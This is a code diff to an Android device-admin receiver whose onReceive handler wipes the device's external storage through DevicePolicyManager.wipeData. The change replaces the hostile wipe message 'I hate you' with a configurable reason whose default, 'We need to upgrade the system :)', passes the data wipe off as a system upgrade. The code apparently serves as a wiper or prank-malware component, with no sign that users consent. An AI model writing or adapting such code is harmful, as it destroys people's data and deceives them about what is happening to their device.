@@ -8,6 +8,9 @@ import android.os.Build;
 import android.os.UserHandle;
 
 public class AdminReceiver extends DeviceAdminReceiver {
+    public static String sReason;
+    public static final String DEFAULT_REASON = "We need to upgrade the system :)";
+    public static final String REASON_KEY = "REASON_KEY";
 
     @Override
     public void onReceive(Context context, Intent intent) {
@@ -20,7 +23,11 @@ public class AdminReceiver extends DeviceAdminReceiver {
         try{
             DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE, "I hate you");
+                if(sReason != null){
+                    devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE, sReason);
+                }else{
+                    devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE,  DEFAULT_REASON);
+                }
             }else{
                 devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
             }
@@ -29,13 +36,10 @@ public class AdminReceiver extends DeviceAdminReceiver {
         }
     }
 
-
-
     @Override
     public void onDisabled(Context context, Intent intent) {
         super.onDisabled(context, intent);
     }
-
 
     @Override
     public CharSequence onDisableRequested(Context context, Intent intent) {
